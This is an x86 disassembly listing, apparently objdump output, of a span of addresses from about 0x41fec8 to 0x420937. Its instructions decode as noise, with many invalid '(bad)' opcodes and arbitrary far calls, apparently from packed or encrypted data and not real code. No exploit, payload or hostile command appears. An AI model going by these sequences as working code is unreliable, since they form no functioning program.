  41fec8:	out    dx,eax
  41fec9:	mov    ds,edx
  41fecb:	jg     0x41fe8f
  41fecd:	cwde   
  41fece:	outs   dx,DWORD PTR ds:[esi]
  41fecf:	jecxz  0x41ff06
  41fed1:	pushf  
  41fed2:	jno    0x41ff4f
  41fed4:	pop    esi
  41fed5:	inc    esi
  41fed6:	xchg   ecx,eax
  41fed7:	add    DWORD PTR [eax+0x46a83451],edx
  41fedd:	push   0xb4d4a572
  41fee2:	ret    
  41fee3:	mov    ds:0xf104cc53,eax
  41fee8:	cmp    BYTE PTR [eax-0x2af618f4],ah
  41feee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feef:	cmp    cl,BYTE PTR [edi-0x7fccf256]
  41fef5:	loopne 0x41ff4d
  41fef7:	cs push ecx
  41fef9:	ret    0x7daf
  41fefc:	sbb    eax,DWORD PTR [edi+0x561a0a3f]
  41ff02:	xchg   ebp,eax
  41ff03:	cdq    
  41ff04:	das    
  41ff05:	leave  
  41ff06:	mov    ebp,0x36b5ee60
  41ff0b:	pop    es
  41ff0c:	pusha  
  41ff0d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41ff0f:	mul    BYTE PTR gs:[ebx+0x1948e260]
  41ff16:	mov    ebp,0x9c44c097
  41ff1b:	addr16 (bad) 
  41ff1d:	(bad)  
  41ff1e:	fimul  WORD PTR [esi+0x3783144d]
  41ff24:	mov    WORD PTR [ebp+0x3da38b5b],?
  41ff2a:	int    0x80
  41ff2c:	das    
  41ff2d:	test   al,0x2b
  41ff2f:	xor    BYTE PTR [ebp-0x24],0xd3
  41ff33:	imul   esi,DWORD PTR [esi],0xffffffed
  41ff36:	scas   eax,DWORD PTR es:[edi]
  41ff37:	xchg   esp,eax
  41ff38:	add    eax,eax
  41ff3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff3b:	ficomp WORD PTR [ecx]
  41ff3d:	adc    BYTE PTR [ebp-0x72],ah
  41ff40:	pop    es
  41ff41:	test   al,0xc5
  41ff43:	daa    
  41ff44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff45:	mov    dl,0x77
  41ff47:	retf   
  41ff48:	push   0x20
  41ff4a:	inc    cl
  41ff4c:	and    BYTE PTR [edx],dh
  41ff4e:	enter  0xb52a,0x70
  41ff52:	ror    DWORD PTR [ebx-0x12c6f339],1
  41ff58:	push   edi
  41ff59:	sbb    eax,0xbbdc5a00
  41ff5e:	jg     0x41ffb7
  41ff60:	mov    gs,WORD PTR [esi]
  41ff62:	test   BYTE PTR [esp+eax*4-0x4b],ah
  41ff66:	fdivr  QWORD PTR [edx]
  41ff68:	adc    eax,0x4aac2544
  41ff6d:	test   al,0xd5
  41ff6f:	mov    cl,0xa8
  41ff71:	jns    0x41ff71
  41ff73:	mov    bh,0xbd
  41ff75:	into   
  41ff76:	xchg   ebx,eax
  41ff77:	test   BYTE PTR [edx+0x24],ah
  41ff7a:	push   es
  41ff7b:	das    
  41ff7c:	push   ebp
  41ff7d:	xor    dh,BYTE PTR [ebp+0x2eb7fddd]
  41ff83:	dec    ebp
  41ff84:	lods   al,BYTE PTR ds:[esi]
  41ff85:	cmp    eax,0x853b6426
  41ff8a:	and    DWORD PTR [esi-0x2e3a27f2],edx
  41ff90:	stc    
  41ff91:	adc    edx,DWORD PTR [ecx+0x6b]
  41ff94:	mov    ch,0x50
  41ff96:	xchg   ecx,eax
  41ff97:	iret   
  41ff98:	stc    
  41ff99:	shr    ebp,1
  41ff9b:	xor    ebx,DWORD PTR [esi+0x1c]
  41ff9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff9f:	aam    0x9e
  41ffa1:	sub    DWORD PTR [ebx-0x18],ebp
  41ffa4:	ret    
  41ffa5:	test   al,cl
  41ffa7:	stc    
  41ffa8:	pop    esp
  41ffa9:	dec    ecx
  41ffaa:	xor    eax,0x26f2e6db
  41ffaf:	xor    ebx,DWORD PTR [ebp+0x47]
  41ffb2:	mov    esp,DWORD PTR [edx+0x71]
	...
  420015:	add    BYTE PTR [edx-0x5b],ah
  420018:	jbe    0x420099
  42001a:	idiv   edi
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0x1a
  420023:	ret    0x3865
  420026:	je     0x42007b
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [ecx+0x9],ah
  420030:	mov    bl,0xc0
  420032:	int    0x3d
  420034:	out    0xbf,al
  420036:	push   eax
  420037:	cld    
  420038:	mov    esp,0x853e5fda
  42003d:	push   ds
  42003e:	cs mov edx,0xf2a7e592
  420044:	std    
  420045:	icebp  
  420046:	add    DWORD PTR [ebp+esi*8+0x1c],eax
  42004a:	daa    
  42004b:	imul   DWORD PTR [eax-0xe9643a4]
  420051:	push   ecx
  420052:	push   0xd44f772f
  420057:	pop    edx
  420058:	push   ebx
  420059:	sub    BYTE PTR [edi],bh
  42005b:	cmc    
  42005c:	test   DWORD PTR [ebp+0x5018359c],edx
  420062:	dec    ebp
  420063:	cmp    dl,dh
  420065:	es (bad) 
  420067:	and    ebx,esi
  420069:	push   eax
  42006a:	xor    ebp,esi
  42006c:	stos   DWORD PTR es:[edi],eax
  42006d:	jp     0x420095
  42006f:	jno    0x420066
  420071:	int3   
  420072:	push   edx
  420073:	pop    edx
  420074:	push   ebx
  420075:	lahf   
  420076:	lods   eax,DWORD PTR ds:[esi]
  420077:	dec    edx
  420078:	arpl   WORD PTR ds:0xe7718848,cx
  42007e:	xor    esp,DWORD PTR [ebx-0x12da6dde]
  420084:	push   edi
  420085:	mov    ss,edi
  420087:	or     eax,0xcc616418
  42008c:	jbe    0x42006b
  42008e:	sbb    DWORD PTR [esi+0x362b2e2f],ebx
  420094:	fisub  WORD PTR [ecx+0x75]
  420097:	jge    0x4200ac
  420099:	jno    0x420021
  42009b:	add    BYTE PTR [edi+0x6c],ch
  42009e:	pop    edi
  42009f:	or     dl,BYTE PTR [eax-0x4d]
  4200a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200a3:	push   0x29b72d54
  4200a8:	sub    ebp,ebx
  4200aa:	sub    al,0x7e
  4200ac:	inc    ecx
  4200ad:	repz sub al,0x56
  4200b0:	pop    es
  4200b1:	cwde   
  4200b2:	add    al,0xda
  4200b4:	packuswb mm2,QWORD PTR [esi+0x6]
  4200b8:	ss mov ebp,0x47ad24d5
  4200be:	inc    ecx
  4200bf:	hlt    
  4200c0:	sbb    al,0x88
  4200c2:	out    dx,al
  4200c3:	out    0xf8,al
  4200c5:	call   0xa76b2b9a
  4200ca:	mov    BYTE PTR [ecx-0x75],al
  4200cd:	test   DWORD PTR [ebp+0x7a],edx
  4200d0:	cld    
  4200d1:	sub    eax,0x2485855e
  4200d6:	les    ebp,FWORD PTR [edx]
  4200d8:	dec    esi
  4200d9:	mov    BYTE PTR [ebx+0x31],dl
  4200dc:	add    al,0xb2
  4200de:	pop    eax
  4200df:	call   0x3aed:0x341a858d
  4200e6:	and    edi,DWORD PTR [ecx+eiz*1-0x48bf3859]
  4200ed:	pop    esi
  4200ee:	sub    eax,0x69d9125a
  4200f3:	out    dx,al
  4200f4:	cmp    DWORD PTR [eax-0x459a9487],edx
  4200fa:	sbb    dx,WORD PTR es:[ecx+0x74]
  4200ff:	mov    esp,esi
  420101:	sar    BYTE PTR [eax+0x4c],1
  420104:	and    ah,BYTE PTR [edx+0x160436a9]
  42010a:	push   ebp
  42010b:	ja     0x42014e
  42010d:	out    dx,al
  42010e:	and    dh,dl
  420110:	or     eax,0xb384b535
  420115:	sti    
  420116:	rcr    BYTE PTR [edx+0x424cbb76],1
  42011c:	mov    al,0xb8
  42011e:	xchg   ebp,eax
  42011f:	out    dx,eax
  420120:	xor    al,0xc7
  420122:	adc    bh,BYTE PTR gs:[eax-0x3f882225]
  420129:	lahf   
  42012a:	ds out 0xa6,al
  42012d:	shl    ebp,1
  42012f:	push   edi
  420130:	mov    cl,0x27
  420132:	adc    al,0x9b
  420134:	les    eax,FWORD PTR [eax]
	...
  420196:	jae    0x420167
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	inc    ebx
  4201a3:	outs   dx,DWORD PTR ds:[esi]
  4201a4:	adc    al,al
  4201a6:	jnp    0x4201fc
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [ebx+0x5a06846d],cl
  4201b3:	loop   0x4201b1
  4201b5:	adc    eax,0xbf50a1c6
  4201ba:	mov    esp,0xd72e41d8
  4201bf:	cwde   
  4201c0:	aam    0x54
  4201c2:	pop    eax
  4201c3:	lahf   
  4201c4:	dec    esp
  4201c5:	jge    0x42018f
  4201c7:	ss daa 
  4201c9:	mov    bh,BYTE PTR [edx+0x651543e5]
  4201cf:	idiv   BYTE PTR ss:[ebp-0x77]
  4201d3:	jb     0x420196
  4201d5:	or     eax,0xf35fffab
  4201da:	jle    0x420258
  4201dc:	repz sar BYTE PTR [ebx+0x69f7320d],0x46
  4201e4:	sub    eax,0xb50aaacd
  4201e9:	mul    BYTE PTR [ebp-0x4fa2b529]
  4201ef:	fstp   DWORD PTR [esi+0x7b66a650]
  4201f5:	aad    0x2e
  4201f7:	or     ah,BYTE PTR [ebp-0x4e3dfe8a]
  4201fd:	sub    al,0x67
  4201ff:	bound  eax,QWORD PTR ds:0x51acbf4c
  420205:	ror    BYTE PTR [ebp+0x4b8f2d6d],0x2e
  42020c:	jne    0x420279
  42020e:	iret   
  42020f:	pop    ebp
  420210:	js     0x420255
  420212:	xchg   ebp,eax
  420213:	sbb    bh,dl
  420215:	push   0xffffff83
  420217:	xor    cl,bl
  420219:	clc    
  42021a:	jns    0x420265
  42021c:	jmp    0x4201cd
  42021e:	pop    ecx
  42021f:	or     bh,cl
  420221:	outs   dx,DWORD PTR ds:[esi]
  420222:	scas   eax,DWORD PTR es:[edi]
  420223:	lods   al,BYTE PTR ds:[esi]
  420224:	test   DWORD PTR [ebx],edx
  420226:	mov    WORD PTR [edi],ss
  420228:	js     0x4201cd
  42022a:	test   DWORD PTR [ebx-0x2f],esi
  42022d:	dec    esp
  42022e:	shr    BYTE PTR [ebx+0x35867994],0xef
  420235:	xchg   edx,eax
  420236:	jnp    0x4201eb
  420238:	or     BYTE PTR [edx+ecx*1+0x20],0x52
  42023d:	mov    edx,DWORD PTR [ebp-0x5c]
  420240:	xchg   ecx,eax
  420241:	aad    0x5d
  420243:	mov    ebx,0x43cae2d1
  420248:	test   al,0xa
  42024a:	pop    ebx
  42024b:	jno    0x4201e8
  42024d:	inc    edi
  42024e:	dec    ecx
  42024f:	jo     0x42021b
  420251:	lods   eax,DWORD PTR ds:[esi]
  420252:	sahf   
  420253:	dec    ebx
  420254:	adc    BYTE PTR [esi],0x57
  420257:	cmp    ebp,DWORD PTR [ecx]
  420259:	icebp  
  42025a:	and    dh,bl
  42025c:	sbb    al,0xd8
  42025e:	or     dl,ah
  420260:	sar    DWORD PTR [edi-0x1a],1
  420263:	or     DWORD PTR [eax],edx
  420265:	push   esp
  420266:	les    esi,FWORD PTR [edx+0xba3006b]
  42026c:	sbb    al,0x48
  42026e:	xor    ebp,edx
  420270:	lods   al,BYTE PTR ds:[esi]
  420271:	test   eax,0x43ffbc6d
  420276:	pop    ds
  420277:	sahf   
  420278:	jmp    0x4202b9
  42027a:	ror    cl,cl
  42027c:	shl    DWORD PTR [ebx-0x73],cl
  42027f:	sar    DWORD PTR [ecx],cl
  420281:	mov    dh,cl
  420283:	mov    dh,0x7
  420285:	pop    esp
  420286:	sub    eax,0x907055b1
  42028b:	mov    ebp,0x99a0aba
  420290:	sub    al,0x1c
  420292:	rol    edi,0xe
  420295:	mov    edi,0xbcf0d526
  42029a:	fwait
  42029b:	ret    
  42029c:	mov    ss,esp
  42029e:	ins    BYTE PTR es:[edi],dx
  42029f:	push   cs
  4202a0:	mov    eax,0xa4f4edf7
  4202a5:	retf   0x5b9d
  4202a8:	test   BYTE PTR [edi-0x7f3106da],0x34
  4202af:	loope  0x420270
  4202b1:	or     DWORD PTR [esi+0xc49e],eax
	...
  420313:	add    BYTE PTR [eax],al
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fist   WORD PTR [edi-0x7de3b3fb]
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    cl,dl
  42032f:	xrelease mov BYTE PTR [edx-0x60],bl
  420333:	out    0x84,eax
  420335:	test   BYTE PTR [esi+0x27],bl
  420338:	xchg   edi,eax
  420339:	push   0xdf77af6f
  42033e:	cmp    ah,BYTE PTR [eax]
  420340:	and    ch,0xb8
  420343:	jge    0x42031b
  420345:	arpl   di,bx
  420347:	sub    DWORD PTR [esi+0x4e07ab11],0x715e9f1c
  420351:	jb     0x4202fb
  420353:	sub    DWORD PTR [eax],0xffffff9c
  420356:	xor    BYTE PTR [eax-0x2a],ch
  420359:	jp     0x420367
  42035b:	inc    edx
  42035c:	or     ebx,DWORD PTR [ecx-0x4481762b]
  420362:	stos   DWORD PTR es:[edi],eax
  420363:	loop   0x42031d
  420365:	(bad)  
  420366:	cmc    
  420367:	out    dx,eax
  420368:	mov    gs,WORD PTR [ebx-0x263ea27a]
  42036e:	jne    0x4203d2
  420370:	adc    DWORD PTR [eax-0x1a],edi
  420373:	mov    cl,0x61
  420375:	rol    DWORD PTR [edx-0x14],1
  420378:	inc    esp
  420379:	sahf   
  42037a:	int    0x2c
  42037c:	pushf  
  42037d:	and    al,0x2b
  42037f:	mov    gs,WORD PTR [edx+0x37b04818]
  420385:	sub    al,0xea
  420387:	repz mov bl,0x26
  42038a:	fs int 0x31
  42038d:	adc    eax,0x825b460e
  420392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420393:	xor    ch,BYTE PTR [esi+ecx*2-0x28]
  420397:	cdq    
  420398:	jb     0x4203be
  42039a:	enter  0x67b8,0xd8
  42039e:	jmp    0x2bee8b12
  4203a3:	fcomp  QWORD PTR [edi+0x48]
  4203a6:	cmp    ebp,ebp
  4203a8:	ret    
  4203a9:	inc    edx
  4203aa:	nop
  4203ab:	outs   dx,DWORD PTR ds:[esi]
  4203ac:	jp     0x4203b4
  4203ae:	stc    
  4203af:	jo     0x42039e
  4203b1:	inc    eax
  4203b2:	enter  0xf5a6,0xa6
  4203b6:	aaa    
  4203b7:	repz iret 
  4203b9:	dec    ecx
  4203ba:	pop    eax
  4203bb:	xchg   ch,bl
  4203bd:	ins    BYTE PTR es:[edi],dx
  4203be:	fcomp  st(5)
  4203c0:	int3   
  4203c1:	pushf  
  4203c2:	cdq    
  4203c3:	mov    eax,0x4569c2a0
  4203c8:	shl    DWORD PTR [eax],0x70
  4203cb:	pop    ds
  4203cc:	adc    DWORD PTR [eax+0x77b2ac54],ebx
  4203d2:	or     DWORD PTR [ecx+0x17ccedc7],ecx
  4203d8:	call   0x6122:0xa94e86ed
  4203df:	mov    eax,ds:0x1e25b92d
  4203e4:	aas    
  4203e5:	popf   
  4203e6:	rcl    BYTE PTR [edx-0x72],cl
  4203e9:	pop    eax
  4203ea:	sar    dl,0xb9
  4203ed:	test   BYTE PTR [di-0x3d],bl
  4203f1:	jp     0x42042d
  4203f3:	hlt    
  4203f4:	sbb    BYTE PTR [edx],0xc7
  4203f7:	scas   eax,DWORD PTR es:[edi]
  4203f8:	sbb    cl,BYTE PTR [edx]
  4203fa:	xchg   ebp,eax
  4203fb:	popf   
  4203fc:	ins    BYTE PTR es:[edi],dx
  4203fd:	outs   dx,DWORD PTR ds:[esi]
  4203fe:	cwde   
  4203ff:	in     eax,dx
  420400:	mov    edi,0xbc7d6381
  420405:	dec    ebx
  420406:	das    
  420407:	test   eax,0xd0b0903f
  42040c:	jl     0x4203ab
  42040e:	inc    esp
  42040f:	push   edi
  420410:	sub    BYTE PTR [ecx-0x5b82a399],ah
  420416:	in     al,dx
  420417:	dec    ebp
  420418:	stos   BYTE PTR es:[edi],al
  420419:	jo     0x420433
  42041b:	or     al,0x1
  42041d:	dec    ebp
  42041e:	popa   
  42041f:	lods   eax,DWORD PTR ds:[esi]
  420420:	aaa    
  420421:	rol    BYTE PTR [ecx+0x69],0xb2
  420425:	cs and ch,dh
  420428:	push   cs
  420429:	hlt    
  42042a:	dec    edx
  42042b:	dec    edx
  42042c:	(bad)  
  42042d:	push   edi
  42042e:	mov    edx,edi
  420430:	bound  esi,QWORD PTR [edx]
  420432:	fnsave [edi]
  420434:	push   es
	...
  420495:	add    BYTE PTR [esi+0x7f125794],ch
  42049b:	shr    edi,cl
  42049d:	mov    esp,0xb41496f0
  4204a2:	inc    eax
  4204a3:	cs sbb al,0xf9
  4204a6:	mov    DWORD PTR [esi+0x1],edx
  4204a9:	add    BYTE PTR [edi],al
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    dl,bh
  4204af:	pop    es
  4204b0:	inc    ecx
  4204b1:	xchg   esp,eax
  4204b2:	jae    0x42051e
  4204b4:	sbb    al,0xfc
  4204b6:	outs   dx,DWORD PTR ds:[esi]
  4204b7:	jl     0x4204ea
  4204b9:	add    eax,0x7db549ca
  4204be:	dec    eax
  4204bf:	mov    ecx,0x5330da3f
  4204c4:	lahf   
  4204c5:	cmc    
  4204c6:	mov    eax,0xbcc90367
  4204cb:	push   cs
  4204cc:	cmp    bl,BYTE PTR [ebx-0x2a12a72f]
  4204d2:	add    ecx,DWORD PTR [ebp+0x28]
  4204d5:	mov    edx,0x45ddfef8
  4204da:	adc    eax,0x21f35ca3
  4204df:	push   es
  4204e0:	mov    cl,0xeb
  4204e2:	mov    ebx,0x11a3eb86
  4204e7:	pop    esp
  4204e8:	dec    ecx
  4204e9:	ror    ah,cl
  4204eb:	jae    0x4204c3
  4204ed:	(bad)  
  4204ef:	call   0x31f1:0x25115750
  4204f6:	enter  0x3a7c,0x97
  4204fa:	xchg   esi,eax
  4204fb:	(bad)  
  4204fc:	jnp    0x420547
  4204fe:	inc    esi
  4204ff:	rcr    BYTE PTR [edi-0xb],0x1a
  420503:	aad    0x3f
  420505:	bound  eax,QWORD PTR [edi+0xcbf1f30]
  42050b:	pop    eax
  42050c:	pop    ebp
  42050d:	mov    bh,0xeb
  42050f:	imul   ebp,ecx,0xfaab1db1
  420515:	repnz or DWORD PTR [eax+0x1b],ebx
  420519:	repnz out 0x9a,eax
  42051c:	adc    bl,BYTE PTR [ebx+0x6e]
  42051f:	add    esp,DWORD PTR [edx+0x37]
  420522:	arpl   WORD PTR [ecx-0x5e],ax
  420525:	adc    eax,0x72a9dd21
  42052a:	test   eax,0xbd6fa4c9
  42052f:	mov    bl,0x6c
  420531:	aad    0xd1
  420533:	clc    
  420534:	lock push ebp
  420536:	out    0xf2,eax
  420538:	cmp    al,0x0
  42053a:	add    dl,BYTE PTR [edi-0x6aa8eec1]
  420540:	add    eax,DWORD PTR [edx]
  420542:	outs   dx,DWORD PTR ds:[esi]
  420543:	mov    ecx,0xa64cd65d
  420548:	lods   al,BYTE PTR ds:[esi]
  420549:	xor    ah,BYTE PTR [edi+0x8]
  42054c:	(bad)  
  42054d:	std    
  42054e:	sub    eax,0x8dc43506
  420553:	add    eax,0x6c84eddf
  420558:	pop    esi
  420559:	mov    bh,0x80
  42055b:	jns    0x42054b
  42055d:	jbe    0x420543
  42055f:	or     al,0x7b
  420561:	and    eax,0x18cd82a8
  420566:	mov    dh,0xa3
  420568:	lods   al,BYTE PTR ds:[esi]
  420569:	jg     0x4205c5
  42056b:	fimul  DWORD PTR [ebx-0x6d1bbad6]
  420571:	xchg   ebx,eax
  420572:	mov    esi,0xcc1f6749
  420577:	mov    ds:0x6b100d04,eax
  42057c:	in     eax,0xf7
  42057e:	and    al,0x53
  420580:	jae    0x4205c1
  420582:	out    0x36,eax
  420584:	sbb    esi,edi
  420586:	push   es
  420587:	dec    esp
  420588:	cli    
  420589:	fimul  DWORD PTR [edi-0x6662b6a6]
  42058f:	in     eax,0x87
  420591:	dec    ebp
  420592:	sbb    al,0x74
  420594:	jp     0x4205cd
  420596:	sub    eax,0xf88c090a
  42059b:	and    ch,0x89
  42059e:	dec    esp
  42059f:	push   0x7d2ab134
  4205a4:	cmc    
  4205a5:	(bad)  
  4205a6:	mov    eax,ds:0x9e7e1cef
  4205ab:	mov    dh,0x2f
  4205ad:	inc    edi
  4205ae:	stos   DWORD PTR es:[edi],eax
  4205af:	fst    DWORD PTR [ecx-0x4f]
  4205b2:	in     eax,dx
  4205b3:	pop    eax
  4205b4:	mov    dl,0x0
	...
  420616:	test   BYTE PTR [eax-0x48],ch
  420619:	or     ah,bh
  42061b:	fdiv   DWORD PTR [esp+ebp*8-0x44ed44f1]
  420622:	pusha  
  420623:	je     0x42061e
  420625:	mov    WORD PTR [eax+0x7000157],ss
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    bh,al
  42062f:	or     cl,BYTE PTR [ebx]
  420631:	mov    edx,0x73b175cf
  420636:	xor    DWORD PTR [edx+edi*1+0x3f],ecx
  42063a:	mov    ch,0x2f
  42063c:	imul   edi,DWORD PTR [ebx+0x6b],0xffffffd4
  420640:	out    dx,eax
  420641:	daa    
  420642:	push   0x68
  420644:	sbb    dh,al
  420646:	(bad)  
  420647:	or     eax,DWORD PTR [ebp+0x7a]
  42064a:	jecxz  0x420689
  42064c:	jb     0x4206a2
  42064e:	stc    
  42064f:	sbb    DWORD PTR [edx-0x58],edx
  420652:	sar    ch,0x80
  420655:	xchg   cl,bl
  420657:	call   0x89be63ab
  42065c:	mov    ds:0x3a54d142,al
  420661:	pop    edx
  420662:	jo     0x420627
  420664:	inc    esp
  420665:	nop
  420666:	add    esi,ebx
  420668:	ds ja  0x420621
  42066b:	sub    eax,0x9fec7ed
  420670:	pop    ebp
  420671:	lods   eax,DWORD PTR ds:[esi]
  420672:	jmp    0x45d6:0x70bd8c0a
  420679:	adc    al,0x5c
  42067b:	sbb    ebp,DWORD PTR [eax+0x4]
  42067e:	sbb    eax,0xd68760c9
  420683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420684:	cld    
  420685:	pop    ds
  420686:	sar    BYTE PTR [ecx+0x7883afb1],cl
  42068c:	pop    ebp
  42068d:	mov    bl,0x86
  42068f:	sub    edi,DWORD PTR [esi+0x294354f6]
  420695:	push   ebx
  420696:	pop    ecx
  420697:	popf   
  420698:	pusha  
  420699:	faddp  st(6),st
  42069b:	bnd jp 0x4206a9
  42069e:	jle    0x420684
  4206a0:	sbb    BYTE PTR [ecx],0xee
  4206a3:	push   esi
  4206a4:	adc    BYTE PTR [ebx],dl
  4206a6:	call   0x96da4fbc
  4206ab:	dec    eax
  4206ac:	loope  0x4206fb
  4206ae:	in     eax,0xa9
  4206b0:	cmc    
  4206b1:	sbb    ch,BYTE PTR [edi]
  4206b3:	xor    al,BYTE PTR gs:[esi+esi*4+0x1c4f5628]
  4206bb:	and    al,0x26
  4206bd:	push   esi
  4206be:	mov    ebp,0x6221c3a8
  4206c3:	or     ebp,DWORD PTR [esi]
  4206c5:	call   0x1613:0x9fb2e7ef
  4206cc:	xchg   ah,dl
  4206ce:	jge    0x42067c
  4206d0:	sbb    al,dh
  4206d2:	and    BYTE PTR [edi+0x283658a8],0x20
  4206d9:	in     al,dx
  4206da:	mov    WORD PTR [ebx-0xf],?
  4206dd:	mov    edx,0x5e56ce3d
  4206e2:	jbe    0x420721
  4206e4:	push   ds
  4206e5:	pop    esi
  4206e6:	dec    ebp
  4206e7:	rol    DWORD PTR [edx+ecx*1],1
  4206ea:	inc    esp
  4206eb:	adc    ch,ch
  4206ed:	sbb    eax,DWORD PTR ds:0x34e98616
  4206f3:	mov    ebp,0x46eb1a7a
  4206f8:	call   0xf39590b1
  4206fd:	sbb    esp,DWORD PTR [esi-0x4b]
  420700:	push   0x5032e0cc
  420705:	icebp  
  420706:	cli    
  420707:	leave  
  420708:	mov    eax,ds:0xc9cb5df2
  42070d:	cmp    eax,0xbbcf4932
  420712:	(bad)  
  420713:	in     al,0xd
  420715:	test   al,0x7
  420717:	add    cl,BYTE PTR [ecx]
  420719:	test   DWORD PTR [edi],0x34949b48
  42071f:	push   0x106b0636
  420724:	popf   
  420725:	mov    bh,0x58
  420727:	out    dx,al
  420728:	setno  al
  42072b:	add    BYTE PTR [edx+0x15],bh
  42072e:	fcomp  QWORD PTR [edi+eiz*8-0x41]
  420732:	pop    ds
  420733:	add    eax,0xd
	...
  420794:	add    BYTE PTR [eax],al
  420796:	mov    DWORD PTR [edi],ebp
  420798:	and    eax,0xad8aa780
  42079d:	das    
  42079e:	jmp    0xb76da37a
  4207a3:	cmp    eax,0x589758d7
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    BYTE PTR [ecx+ebx*2+0x76],al
  4207b1:	xor    eax,0x8cc84af8
  4207b6:	dec    esp
  4207b7:	jmp    0xcd14:0xfcb22983
  4207be:	adc    esi,edi
  4207c0:	(bad)  
  4207c2:	push   ds
  4207c3:	push   esp
  4207c4:	xlat   BYTE PTR ds:[ebx]
  4207c5:	or     eax,0x9feb8df0
  4207ca:	test   eax,0xb5f7b2a5
  4207cf:	test   BYTE PTR [edi-0x34],ah
  4207d2:	xor    al,0x94
  4207d4:	mov    ebx,0xce1da6df
  4207d9:	or     BYTE PTR [edx-0x5b],0x6
  4207dd:	sar    BYTE PTR [edi],1
  4207df:	inc    eax
  4207e0:	or     esp,ebp
  4207e2:	adc    DWORD PTR [ebx-0x38aaf79f],0x23
  4207e9:	mov    ecx,edx
  4207eb:	inc    esp
  4207ec:	les    ebp,FWORD PTR [ebp-0x4]
  4207ef:	rol    BYTE PTR [edx],1
  4207f1:	clc    
  4207f2:	call   0xe42aef8a
  4207f7:	push   edx
  4207f8:	loope  0x420870
  4207fa:	sub    eax,0xe2e37e4c
  4207ff:	cmc    
  420800:	mov    edi,0x16da426
  420805:	push   0xad6bb3da
  42080a:	push   ecx
  42080b:	clc    
  42080c:	mov    ss,WORD PTR gs:[edi]
  42080f:	lods   al,BYTE PTR ds:[esi]
  420810:	push   ebx
  420811:	ins    BYTE PTR es:[edi],dx
  420812:	stc    
  420813:	xchg   ecx,eax
  420814:	and    ah,BYTE PTR [ecx]
  420816:	loope  0x4207a6
  420818:	fild   DWORD PTR [ecx]
  42081a:	jge    0x420827
  42081c:	pop    eax
  42081d:	ins    BYTE PTR es:[edi],dx
  42081e:	pusha  
  42081f:	adc    bl,al
  420821:	cmp    BYTE PTR [ecx],ah
  420823:	cwde   
  420824:	aas    
  420825:	repnz bound edi,QWORD PTR [edi+0x2f]
  420829:	mov    bl,0xf3
  42082b:	add    eax,DWORD PTR [esi+0x7822f8e1]
  420831:	loope  0x420822
  420833:	test   BYTE PTR [eax],0x4c
  420836:	rcl    ch,1
  420838:	pop    ebx
  420839:	push   ebp
  42083a:	sbb    al,0xe0
  42083c:	lods   eax,DWORD PTR gs:[esi]
  42083e:	add    eax,0xfbde41ac
  420843:	mov    dl,0x5f
  420845:	mov    dh,0x98
  420847:	pop    edi
  420848:	pop    ebx
  420849:	mov    cl,BYTE PTR [eax]
  42084b:	cmp    BYTE PTR [edx-0x38],0x30
  42084f:	ins    BYTE PTR es:[edi],dx
  420850:	xchg   ebp,eax
  420851:	and    ecx,DWORD PTR [ecx-0xa]
  420854:	repz push ss
  420856:	inc    ebp
  420857:	cld    
  420858:	inc    edx
  420859:	test   al,0x32
  42085b:	cwde   
  42085c:	xchg   BYTE PTR [ecx-0x65],cl
  42085f:	sub    cl,dh
  420861:	outs   dx,BYTE PTR ds:[esi]
  420862:	push   es
  420863:	lahf   
  420864:	or     DWORD PTR [esi+esi*4+0x1e],ebp
  420868:	or     eax,0xeb724153
  42086d:	sti    
  42086e:	cmp    eax,0x79df3448
  420873:	cdq    
  420874:	cwde   
  420875:	jno    0x42089f
  420877:	push   ebp
  420878:	(bad)  
  420879:	retf   0xecb1
  42087c:	lds    ecx,FWORD PTR [edi]
  42087e:	fnsave [esp+eiz*4+0x6b]
  420882:	pop    edx
  420883:	xchg   ecx,eax
  420884:	mov    ecx,0x23055af9
  420889:	cmp    ebx,DWORD PTR [edx]
  42088b:	xor    BYTE PTR [eax+0x6],0x50
  42088f:	ja     0x420896
  420891:	sbb    eax,eax
  420893:	pop    ss
  420894:	aaa    
  420895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420896:	test   eax,0xdfc6a498
  42089b:	mov    al,ds:0x7d6e1cd4
  4208a0:	rcr    ebp,0x50
  4208a3:	test   eax,0xb3bfff83
  4208a8:	push   0x5
  4208aa:	sbb    eax,0x9c6dc403
  4208af:	gs pop eax
  4208b1:	mov    esi,0xac3bed
	...
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x786f
  420924:	xlat   BYTE PTR ds:[ebx]
  420925:	aad    0x9e
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [eax+0x15ff4f26],ah
  420933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420934:	xchg   ebp,eax
  420935:	jge    0x42091f
  420937:	test   DWORD PTR [ecx+ecx*1-0x78],edx
